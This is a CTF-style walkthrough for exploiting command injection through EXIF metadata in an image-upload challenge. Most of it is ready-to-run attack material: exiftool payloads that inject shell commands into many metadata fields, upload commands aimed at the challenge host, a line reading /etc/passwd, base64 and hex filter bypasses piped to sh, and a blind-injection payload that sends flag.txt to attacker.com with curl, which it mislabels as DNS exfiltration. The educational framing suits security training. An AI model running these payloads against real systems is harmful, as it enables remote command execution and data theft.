# Step-by-Step Exploitation Walkthrough

This document provides a detailed walkthrough of exploiting the EXIF command injection vulnerability.

## Understanding the Challenge

### What We Know
1. Target URL: http://chall.0xfun.org:61927/
2. The application allows image uploads
3. It processes EXIF metadata from images
4. There's a file called `flag.txt` on the server
5. Goal: Execute commands to read flag.txt

### The Vulnerability
The server likely processes EXIF metadata using a command-line tool (like exiftool) without proper input sanitization. This allows attackers to inject shell commands through EXIF metadata fields.

## Exploitation Methods

### Method 1: Using the Automated Python Script

**Step 1**: Install dependencies
```bash
pip install -r requirements.txt
```

**Step 2**: Run the exploit
```bash
python3 exploit_exif_injection.py
```

The script will:
- Create a malicious image
- Show you the exiftool commands to inject payloads
- Attempt to upload to the target
- Parse the response for flags

**Expected Output**:
```
╔═══════════════════════════════════════════════════════════╗
║       EXIF Command Injection Exploit                      ║
║       Target: Image Upload with EXIF Processing           ║
╚═══════════════════════════════════════════════════════════╝

[*] Creating malicious image with command: cat flag.txt
[+] Base image created: exploit.jpg
[!] Use exiftool to add malicious EXIF data to this image

[*] Step 1: Add malicious EXIF data using exiftool:
------------------------------------------------------------
  exiftool -Artist="'; cat flag.txt; echo '" exploit.jpg
  exiftool -Make="\"; cat flag.txt #" exploit.jpg
  ...
```

### Method 2: Using the Bash Script

**Step 1**: Make the script executable
```bash
chmod +x exploit.sh
```

**Step 2**: Run it
```bash
./exploit.sh
```

The bash script automates everything:
- Creates a base image
- Injects multiple payloads
- Uploads to the target
- Displays the response

### Method 3: Manual Exploitation (Most Educational)

This method helps you understand exactly what's happening.

#### Step 1: Create a Base Image

Using ImageMagick:
```bash
convert -size 100x100 xc:red exploit.jpg
```

Or using any existing image:
```bash
cp sample.jpg exploit.jpg
```

#### Step 2: Craft Malicious EXIF Data

We'll inject commands into various EXIF fields. Try each of these:

**Payload 1 - Semicolon Injection in Artist Field**:
```bash
exiftool -Artist="'; cat flag.txt; echo '" exploit.jpg
```

This payload works if the server code looks like:
```python
cmd = f"exiftool -Artist {filename}"
artist = os.popen(cmd).read()
```

The injected semicolon breaks out of the exiftool command and runs `cat flag.txt`.

**Payload 2 - Pipe Injection in Copyright**:
```bash
exiftool -Copyright="test | cat flag.txt" exploit.jpg
```

**Payload 3 - Command Substitution in Software**:
```bash
exiftool -Software="test$(cat flag.txt)" exploit.jpg
```

**Payload 4 - Backtick Substitution in Make**:
```bash
exiftool -Make="test\`cat flag.txt\`" exploit.jpg
```

**Payload 5 - AND Chaining in Model**:
```bash
exiftool -Model="test && cat flag.txt" exploit.jpg
```

#### Step 3: Verify Your Payloads

Check that the EXIF data was injected correctly:
```bash
exiftool exploit.jpg
```

You should see your payloads in the output:
```
Artist                          : '; cat flag.txt; echo '
Copyright                       : test | cat flag.txt
Software                        : test$(cat flag.txt)
...
```

#### Step 4: Upload the Image

**Option A - Using curl**:
```bash
curl -X POST -F "file=@exploit.jpg" http://chall.0xfun.org:61927/upload
```

**Option B - Using the browser**:
1. Open http://chall.0xfun.org:61927/
2. Click the upload button
3. Select your exploit.jpg
4. Submit

**Option C - Using Python requests**:
```python
import requests

with open('exploit.jpg', 'rb') as f:
    files = {'file': f}
    response = requests.post('http://chall.0xfun.org:61927/upload', files=files)
    print(response.text)
```

#### Step 5: Analyze the Response

Look for:
1. **Direct flag output**: `flag{...}` or similar pattern
2. **EXIF data display**: The server might show the "Artist" field with the command output
3. **Error messages**: These might reveal command execution
4. **HTML source**: Check view-source for hidden content

Example response that indicates success:
```html
<div class="exif-data">
    <p>Artist: flag{exif_injection_successful_xyz123}</p>
</div>
```

## Testing Locally First

Before attacking the real server, test your exploit locally:

**Step 1**: Start the vulnerable server
```bash
python3 vulnerable_server.py
```

**Step 2**: Test your exploit against localhost
```bash
python3 exploit_exif_injection.py http://localhost:5000/upload
```

Or:
```bash
./exploit.sh http://localhost:5000/upload
```

## Troubleshooting

### Problem: "exiftool not found"

**Solution**: Install exiftool
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install libimage-exiftool-perl

# macOS
brew install exiftool

# Verify installation
exiftool -ver
```

### Problem: Upload returns 400 Bad Request

**Possible causes**:
1. Incorrect form field name (try 'file', 'image', 'upload')
2. File size too large
3. Wrong content type

**Solution**: Try different field names:
```bash
curl -F "image=@exploit.jpg" http://target/upload
curl -F "upload=@exploit.jpg" http://target/upload
curl -F "file=@exploit.jpg" http://target/upload
```

### Problem: Upload succeeds but no flag in response

**Possible causes**:
1. Wrong payload syntax
2. Command output not included in response
3. Different command required

**Solution**: Try alternative techniques:
```bash
# Try ls to see if command execution works
exiftool -Artist="'; ls -la; echo '" exploit.jpg

# Try reading /etc/passwd as a test
exiftool -Artist="'; cat /etc/passwd; echo '" exploit.jpg

# Try different flag locations
exiftool -Artist="'; cat /flag.txt; echo '" exploit.jpg
exiftool -Artist="'; cat ../flag.txt; echo '" exploit.jpg
exiftool -Artist="'; find / -name flag.txt 2>/dev/null; echo '" exploit.jpg
```

### Problem: Server returns 500 Internal Server Error

This actually might be a good sign! The command might be executing but causing an error.

**Solution**: Try simpler payloads:
```bash
exiftool -Artist="'; ls; echo '" exploit.jpg
exiftool -Artist="test && cat flag.txt" exploit.jpg
```

## Alternative Exploitation Techniques

### 1. Blind Command Injection

If you can't see output, try these:

**DNS Exfiltration**:
```bash
exiftool -Artist="'; cat flag.txt | curl -d @- attacker.com; echo '" exploit.jpg
```

**Time-based Detection**:
```bash
exiftool -Artist="'; sleep 10; echo '" exploit.jpg
# If the response takes 10 seconds, command execution works!
```

### 2. Multiple Field Injection

Inject payloads into ALL fields to increase success chances:
```bash
#!/bin/bash
IMAGE="exploit.jpg"

# Inject into multiple fields
exiftool -Artist="'; cat flag.txt; echo '" $IMAGE
exiftool -Copyright="test | cat flag.txt" $IMAGE
exiftool -Software="test\$(cat flag.txt)" $IMAGE
exiftool -Make="test && cat flag.txt" $IMAGE
exiftool -Model="test || cat flag.txt" $IMAGE
exiftool -Comment="test\`cat flag.txt\`" $IMAGE
```

### 3. Encoding Techniques

If special characters are filtered:

**Base64 encoding**:
```bash
# Encode the command
echo "cat flag.txt" | base64  # Y2F0IGZsYWcudHh0Cg==

# Inject with decoding
exiftool -Artist="'; echo Y2F0IGZsYWcudHh0Cg== | base64 -d | sh; echo '" exploit.jpg
```

**Hex encoding**:
```bash
# Use printf with hex values
exiftool -Artist="'; printf \x63\x61\x74\x20flag.txt | sh; echo '" exploit.jpg
```

## Success Criteria

You've successfully completed the challenge when you obtain the flag. The flag will typically be in the format:

- `flag{...}`
- `0xfun{...}`
- `CTF{...}`

## What You Learned

Through this challenge, you've learned:

1. ✅ How EXIF metadata works
2. ✅ Command injection vulnerabilities
3. ✅ Shell command syntax and special characters
4. ✅ Input validation importance
5. ✅ Exploitation techniques
6. ✅ How to test security vulnerabilities ethically

## Next Steps

After completing this challenge:

1. Study the secure coding examples in EXPLOIT_README.md
2. Learn about other injection vulnerabilities (SQL, LDAP, XML)
3. Practice on platforms like HackTheBox, TryHackMe, or PentesterLab
4. Read OWASP Top 10 documentation
5. Consider studying for certifications like OSCP or CEH

## Important Reminders

⚠️ **Legal and Ethical Considerations**:
- Only test on systems you own or have explicit permission to test
- This challenge is authorized for educational purposes
- Unauthorized access to systems is illegal
- Always follow responsible disclosure practices

Happy Hacking! 🚀
